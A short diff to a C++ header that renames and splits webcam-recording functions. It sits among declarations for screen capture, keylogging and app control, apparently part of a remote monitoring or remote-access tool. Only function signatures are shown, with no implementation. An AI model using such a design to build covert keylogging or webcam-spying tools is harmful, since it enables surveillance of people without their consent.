@@ -20,7 +20,8 @@ public:
     static json stopApp(const json &);
 
     static json captureScreen(const json &);
-    static json recordWebcam(const json &);
+    static json startWebcamRecord(const json &);
+    static json stopWebcamRecord(const json &);  
 
     static json startKeylog(const json &);
     static json stopKeylog(const json &);
